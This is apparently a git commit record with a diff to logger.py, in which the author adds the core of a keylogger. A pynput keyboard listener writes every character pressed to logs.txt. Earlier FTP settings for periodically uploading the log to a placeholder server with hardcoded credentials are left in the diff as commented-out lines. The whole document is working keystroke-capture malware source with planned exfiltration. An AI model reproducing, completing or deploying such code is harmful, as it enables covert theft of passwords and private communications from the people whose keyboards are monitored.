3d7775cf85f59e38dfee3bdb7b8e0c1ec67b01ad
Harry Caldwell <harrycaldwell2011@hotmail.co.uk>
2024-03-14 21:04:12 +0000

    main functionality
    Created the function for the keylogger to actually work, after testing the logger successfully creates the log.txt file and logs all keys pressed in the file

--- logger.py
+++ logger.py
@@ -1,11 +1,28 @@
 # import libraries
-import keyboard
+from pynput import keyboard
 from ftplib import FTP
 import datetime
+import threading
+
 
 # FTP Configurations
-send_file_every = 1800  # This is the time in seconds, can be changed
-ftp = FTP('server.ip')
-ftp.login(user='username', passwd='123')
+#send_file_every = 1800  # This is the time in seconds, can be changed
+#ftp = FTP('server.ip')
+#ftp.login(user='username', passwd='123')
 
 
+# This will be what logs the keys that are pressed, in addition to writing it to a file
+def keypressed(key):
+    print(str(key))
+    with open('logs.txt', 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            return("Error")
+
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=keypressed)
+    listener.start()
+    input()
